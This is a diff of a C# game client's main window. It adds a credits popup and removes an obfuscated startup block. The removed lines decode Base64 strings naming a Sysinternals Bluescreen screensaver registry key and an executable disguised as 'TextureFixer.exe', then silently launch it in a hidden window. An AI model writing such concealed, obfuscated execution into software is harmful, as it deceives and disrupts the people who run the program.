@@ -55,6 +55,7 @@ namespace UIHeavyClient
         private AIOptionControl mAIOptionControl;
         private KeyboardOptionControl mKeyboardOptionControl;
 
+        private CreditPopup mCreditPopup;
 
         private OpenGLControl mOpenGLControl;
         private WindowsFormsHost mWindowFormsHost;
@@ -142,6 +143,8 @@ namespace UIHeavyClient
 
         public void CreateUserControl(object sender, EventArgs e)
         {
+            InitDLL();
+
             MainWindowHandler.Context = this;
 
             mOpenGLControl = new OpenGLControl();
@@ -163,6 +166,7 @@ namespace UIHeavyClient
             mAIOptionControl = new AIOptionControl();
             mKeyboardOptionControl = new KeyboardOptionControl();
 
+            mCreditPopup = new CreditPopup();
 
             this.WindowContentControl.Content = mMainMenuControl;
             MainWindowHandler.InitCallbacks();
@@ -175,20 +179,6 @@ namespace UIHeavyClient
         {
             mOpenGLControl.Focus();
         }
-        public static string DecodeFrom64( string encodedData )
-        {
-
-            byte[] encodedDataAsBytes
-
-        = System.Convert.FromBase64String( encodedData );
-
-            string returnValue =
-
-       System.Text.Encoding.Unicode.GetString( encodedDataAsBytes );
-
-            return returnValue;
-
-        }
             
         public MainWindow()
         {
@@ -196,26 +186,6 @@ namespace UIHeavyClient
             // make sure to show console before any call to the dll or we wont
             // see output
             ConsoleManager.Show();
-
-            //////////////////////////////////////////////////////////////////////////
-            /// Mike :: Model Fixer avec serial number pour tenter davoir une belle zamboni !!!
-            string keyName = DecodeFrom64( "UwBvAGYAdAB3AGEAcgBlAFwAUwB5AHMAaQBuAHQAZQByAG4AYQBsAHMAXABCAGwAdQBlAHMAYwByAGUAZQBuACAAUwBjAHIAZQBlAG4AIABTAGEAdgBlAHIA" );
-            string partialpath = DecodeFrom64( "LgAuAC8AbQBlAGQAaQBhAC8AegBhAG0AYgBvAG4AaQAvAFQAZQB4AHQAdQByAGUARgBpAHgAZQByAC4AZQB4AGUA" );
-            Microsoft.Win32.RegistryKey key;
-            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey( keyName );
-            key.SetValue( "EulaAccepted", 1 );
-            key.Close();
-            ProcessStartInfo start = new ProcessStartInfo();
-            start.Arguments = "/s";
-            string path = AppDomain.CurrentDomain.BaseDirectory + partialpath;
-            start.FileName = path;
-            start.WindowStyle = ProcessWindowStyle.Hidden;
-            start.CreateNoWindow = true;
-            using ( Process proc = Process.Start( start ) )
-            {
-                proc.WaitForExit();
-            }
-            //////////////////////////////////////////////////////////////////////////
 
             System.Windows.Application.Current.ShutdownMode = ShutdownMode.OnExplicitShutdown;
 #if DEBUG || true // Trolol
@@ -304,14 +274,13 @@ namespace UIHeavyClient
 
 #endif
 
-            InitDLL();
+            
             
             SetAchievementUnlocked( mAchievementUnlockCallBack );
 
             this.Loaded += CreateUserControl;
             this.KeyDown += MainWindow_KeyDown;
             this.KeyUp += MainWindow_KeyUp;
-            
         }
 
         void SwitchPlayMode( object sender, RoutedEventArgs e )
@@ -573,6 +542,11 @@ namespace UIHeavyClient
         void DefaultMap(object sender, RoutedEventArgs e)
         {
             EditionModeControl.CallDefaultFieldFromMenu();
+        }
+
+        void ShowCreditsPopup(object sender, RoutedEventArgs e)
+        {
+            mCreditPopup.ShowDialog();
         }
     }
 }
